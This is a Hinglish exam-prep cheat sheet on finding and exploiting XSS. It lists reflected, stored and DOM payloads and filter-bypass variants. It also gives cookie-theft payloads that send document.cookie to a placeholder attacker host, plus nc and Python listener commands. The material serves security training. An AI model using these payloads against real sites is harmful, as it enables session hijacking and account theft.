# XSS DHUNDO / EXPLOIT KARO

---

## Pehle Samjho: XSS Kya Hai?

XSS = Cross-Site Scripting. Iska matlab hai ki tum apna JavaScript code kisi website pe chala sakte ho.

**Kaise kaam karta hai:** Browser HTML render karta hai. Agar website tumhara input directly HTML mein daal de bina sanitize kiye, toh tum `<script>` tag inject kar sakte ho aur browser usse execute kar dega jaise wo website ka hi code ho.

**Example:** Ek search page hai — tum search karo `hello`, page dikhata hai "Results for: hello"
Ab tum search karo `<script>alert(1)</script>` — page dikhayega "Results for: " aur alert popup aa jayega!

**Kyun dangerous hai?**
- Cookie chura sakte ho (session hijack)
- Page ka content badal sakte ho (defacement)
- User ko redirect kar sakte ho (phishing)
- Keylogger inject kar sakte ho

---

## XSS Ke 3 Types — Samjho Dhang Se

| Type | Kahan Hota Hai | Persist Karta Hai? | Example |
|---|---|---|---|
| **Reflected** | URL parameter se inject, response mein reflect | Nahi, sirf ek baar | Search box, URL params |
| **Stored** | Database mein save ho jaata hai | Haan, har visitor ko | Comments, guestbook, profile |
| **DOM-Based** | JavaScript client-side mein process | Nahi, browser-side | URL fragment (#), JS processing |

**Reflected:** Tum ek malicious URL bhejte ho victim ko. Victim click kare = XSS execute.
**Stored:** Tum inject karo ek baar (comment mein). Har koi jo page visit kare usse execute hoga.
**DOM-Based:** Server involve nahi — JavaScript khud URL se data le ke page mein daalti hai.

---

## CASE 1: Reflected XSS — URL / Search / Input Field

```html
<!-- Pehle basic try karo -->
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.cookie)</script>

<!-- URL mein inject karo -->
http://target.com/search?q=<script>alert(1)</script>

<!-- Input field mein daal ke submit karo -->
<!-- Agar alert popup aaya = Reflected XSS confirmed! -->
```

**Output kya expect karo:** Alert box popup hoga page pe. Agar nahi aata toh filter lag raha hai — CASE 4 dekho.

---

## CASE 2: Stored XSS — Comment / Guestbook / Profile

```html
<!-- Comment box / guestbook / any form mein inject karo -->
<script>alert(document.cookie)</script>
<script>alert('Stored XSS')</script>
<img src=x onerror=alert('StoredXSS')>
<body onload=alert('XSS')>
```

**Kaise verify karo:** Submit karo → Page reload karo → Agar alert phir aaye = STORED XSS!
Matlab ye database mein save ho gaya hai aur har visitor ko execute hoga.

---

## CASE 3: DOM-Based XSS

```
# URL fragment (#) mein inject karo — ye server ko jaata hi nahi
http://target.com/page#<script>alert(1)</script>
http://target.com/page#<img src=x onerror=alert(1)>
```

**Kaise identify karo:** Page ka source dekho — agar JavaScript kuch aisa karta hai:
```javascript
document.write(location.hash)
innerHTML = location.hash
```
Toh DOM XSS possible hai.

---

## CASE 4: Filter Bypass — Jab Basic Payload Block Ho

```html
<!-- CASE 4a: <script> blocked hai -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<iframe src="javascript:alert(1)">
<marquee onstart=alert(1)>

<!-- CASE 4b: Case-sensitive filter -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x onerror=alert(1)>
<Svg OnLoad=alert(1)>

<!-- CASE 4c: alert blocked hai -->
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>eval('al'+'ert(1)')</script>

<!-- CASE 4d: Quotes blocked -->
<script>alert(1)</script>
<script>alert(/XSS/)</script>
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- CASE 4e: Event handlers mein inject (quotes ke andar) -->
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>

<!-- CASE 4f: HTML encoding bypass -->
<script>alert(&#x27;XSS&#x27;)</script>
```

**Strategy:** Pehle basic `<script>alert(1)</script>` try karo. Block ho? → img/svg try karo. Wo bhi block? → event handlers try karo. Sab block? → encoding try karo.

---

## CASE 5: Cookie Stealing — Practical Exploitation

**Step 1:** Apne Kali machine pe listener start karo:
```bash
# Simple Python HTTP server
python3 -m http.server 8888
# Ya netcat
nc -lvnp 8888
```

**Step 2:** Ye payload inject karo (reflected ya stored):
```html
<script>document.location='http://YOUR_KALI_IP:8888/?c='+document.cookie</script>

<!-- Ya agar redirect nahi chahiye (stealthy) -->
<script>new Image().src='http://YOUR_KALI_IP:8888/?c='+document.cookie</script>

<!-- Img tag version -->
<img src=x onerror="this.src='http://YOUR_KALI_IP:8888/?c='+document.cookie">
```

**Step 3:** Listener pe cookie milega. Browser DevTools > Application > Cookies mein set karo aur page refresh karo — session hijacked!

**Output kya dikhega listener pe:**
```
GET /?c=PHPSESSID=abc123def456 HTTP/1.1
```

---

## CASE 6: Common Exam Scenarios

**Scenario A: "Find XSS vulnerability"**
→ Har input field mein `<script>alert(1)</script>` daalo
→ URL parameters mein inject karo
→ Block ho toh img/svg try karo

**Scenario B: "Steal cookie using XSS"**
→ Listener start karo → document.cookie payload inject karo

**Scenario C: "XSS in specific field"**
→ Pehle context samjho — kya tumhara input quotes ke andar hai? Tag ke andar hai?
→ `"><script>alert(1)</script>` ya `'><img src=x onerror=alert(1)>` try karo

---

## Common Mistakes (Mat Karna Ye)

1. **Listener start karna bhool gaye:** Cookie steal mein pehle `nc -lvnp 8888` ya python server start karo
2. **Context nahi samjhe:** Agar input already quotes ke andar hai toh pehle quotes close karo (`">`)
3. **HTTP vs HTTPS:** Cookie steal URL mein apna sahi IP daalo, protocol mat bhulo
4. **Stored XSS verify nahi kiya:** Submit ke baad page reload karke dekhna — agar alert phir aaye tabhi stored hai
5. **DOM XSS mein server dekhte raho:** DOM XSS server-side nahi hota — browser ka JS check karo
6. **alert ke jagah console.log likh diya:** Exam mein alert(1) chahiye for proof, console.log nahi dikhega visually

---

## Quick Decision Tree

```
XSS question aaya?
  │
  ├─ Input field / URL parameter hai?
  │    └─ <script>alert(1)</script> try karo
  │
  ├─ Blocked ho raha hai?
  │    ├─ <script> blocked → <img src=x onerror=alert(1)> try karo
  │    ├─ img blocked → <svg onload=alert(1)> try karo
  │    ├─ alert blocked → confirm(1) ya prompt(1)
  │    └─ Sab blocked → encoding / case change / event handlers
  │
  ├─ Stored ya Reflected?
  │    ├─ Comment/guestbook mein hai → Stored (persist karega)
  │    └─ URL param / search mein hai → Reflected (ek baar)
  │
  ├─ Cookie steal karna hai?
  │    ├─ Listener start karo (nc/python)
  │    ├─ document.location + document.cookie payload
  │    └─ Cookie milne pe browser mein set karo
  │
  └─ DOM-Based suspect?
       └─ Page source mein JS dekho → location.hash / document.write
```
